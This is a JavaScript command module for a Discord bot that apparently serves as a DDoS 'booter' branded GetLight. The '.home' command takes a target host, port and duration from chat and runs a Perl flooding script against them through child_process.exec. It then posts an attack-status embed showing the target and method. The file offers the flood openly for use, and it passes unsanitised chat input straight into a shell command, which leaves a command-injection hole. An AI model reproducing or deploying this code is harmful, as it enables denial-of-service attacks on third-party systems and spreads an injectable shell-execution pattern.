const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const duration = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex .home 1.1.1.1 80 60`")
	.setFooter("Please do not attack government server!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`perl home.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RED')
	.setTitle('⭐️ **GetLight** ⭐️')
	.setTimestamp()
  .setDescription("**Plan**: `FREE 🤡` \n **𝓣𝓪𝓻𝓰𝓮𝓽** : `" + host + "` \n **Port** : `" + port + "` \n **Method** : `HOME 💣` \n **Time** : `" + duration + "`")
	.setFooter('© Developer: Cloxdyw', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media.giphy.com/media/WMiSdSm5fEAI3z5gd0/giphy.gif", "https://media.giphy.com/media/WMiSdSm5fEAI3z5gd0/giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/LHzau5s16pUr1On14y/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RED')
	.setTitle('⭐️ **GetLight** ⭐️')
	.setTimestamp()
	.setDescription("**► Please wait for verification  **")
	.setFooter('© Developer: Cloxdyw', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['home'],
  permLevel: 0
}

exports.help = {
  name: 'home',
  description: 'Cloxdyw',
  usage: 'home'
}
